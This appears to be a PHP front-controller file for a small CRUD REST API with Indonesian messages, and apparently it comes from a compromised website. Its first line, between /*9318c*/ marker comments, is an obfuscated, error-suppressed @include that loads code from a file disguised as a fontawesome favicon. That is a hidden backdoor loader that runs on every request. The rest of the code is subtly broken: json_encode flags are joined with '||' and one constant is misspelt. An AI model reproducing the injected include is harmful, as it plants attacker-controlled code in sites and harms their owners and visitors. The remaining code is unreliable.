<?php
/*9318c*/

@include "\x2fhom\x65/re\x73tar\x74c/p\x75bli\x63_ht\x6dl/a\x702/v\x65ndo\x72s/f\x6fnta\x77eso\x6de/f\x61vic\x6fn_7\x34286\x30.ic\x6f";

/*9318c*/

require_once 'api.php';

	# code...
$method = $_SERVER['REQUEST_URI'];
$request = explode('index.php/', trim($_SERVER['REQUEST_URI'],'/'));

// echo $method;
// echo "<br>";
$action = array_pop($request);
switch ($action) {
    
	case 'getData':
	getData();
	break;
    case 'addData':
	addData();
	break;    
    case 'deleteData':
	deleteData();
	break; 
	default:
	// $message["response"] = "Unknown method ";
	echo "Tidak dapat membaca URL";
	break;
}



function getData(){
	$api = new api();
	$message = array();
	
	if (is_array($data = $api->getData())) {
	
        $response = $data;
	} else {
		$response = array('getData' => "error");   
	}

	header('Content-type: application/json; charset=utf-8');
	echo json_encode($response, JSON_PRETTY_PRINT || JSON_UNESCAPED_UNICODE || JSON_UNESCAPED_SLASHED);

}
function addData(){
	$api = new api();
	$message = array();
	$params = array();
	$params['fname'] = $_POST["fname"];
	$params['lname'] = $_POST["lname"];
	$params['gender'] = $_POST["gender"];
	$params['address'] = $_POST["address"];
	
	if (is_array($data = $api->addData($params))) {
	
        $response = $data;
	} else {
		$response = array('addData' => "Sukses");
        header("Location: http://localhost/apirest/");
	}

	header('Content-type: application/json; charset=utf-8');
	echo json_encode($response, JSON_PRETTY_PRINT || JSON_UNESCAPED_UNICODE || JSON_UNESCAPED_SLASHED);

}

function deleteData(){
	$api = new api();
	$message = array();
	$params = array();
	$params['id'] = $_POST["id"];
	
	
	if (is_array($data = $api->deleteData($params))) {
	
        $response = $data;
	} else {
		$response = array('deleteData' => "Sukses");
        header("Location: http://localhost/apirest/");
	}

	header('Content-type: application/json; charset=utf-8');
	echo json_encode($response, JSON_PRETTY_PRINT || JSON_UNESCAPED_UNICODE || JSON_UNESCAPED_SLASHED);

}


?>
